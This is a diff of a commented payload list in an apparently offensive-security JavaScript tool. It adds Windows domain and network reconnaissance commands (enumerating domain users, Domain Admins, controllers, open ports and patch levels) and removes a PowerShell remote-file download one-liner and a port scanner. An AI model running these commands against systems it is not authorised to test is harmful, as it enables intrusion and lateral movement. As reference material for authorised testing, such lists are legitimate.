@@ -173,17 +173,36 @@ module.exports = {
 TODO - Add these Payloads
 
 ##########
+Networking
+##########
+
+ipconfig /all
+netstat -r  Displays the routing table
+netstat -nabo Lists ports / connections with corresponding process
+
+netstat -na | findstr :445  Find listening connections on specific port
+netstat -nao | findstr LISTENING   Find listening connections and PIDs
+
+net view /domain
+net user /domain   Lists all of the domain users
+
+net localgroup administrators  | Prints local admins
+net group “Domain Admins” /domain  | Prints list of Domain Admins
+net localgroup administrators /domain | Prints list of Domain Admins
+net group “Domain Controllers” /domain  | Prints the list of Domain Controllers for the current domain
+
+
+#####
+WMIC
+#####
+
+wmic qfe qfe get hotfixid | Get Patch IDs
+
+
+##########
 POWERSHELL
 ##########
 
-Download File
-=============
-
-(new-object system.net.webclient).downloadFile("<RHOST>","<PROMPT (local path)>")
-
-Port Scanner
-============
-
-$ports=(<PROMPT (ports)>);$ip="<RHOST>";foreach ($port in $ports){try{$socket=New-object System.Net.Sockets.TCPClient($ip,$port);}catch{};if ($socket -eq $NULL){echo $ip":"$port" - Closed";}else{echo $ip":"$port" - Open";$socket = $NULL;}}
+ActiveX
 
 */
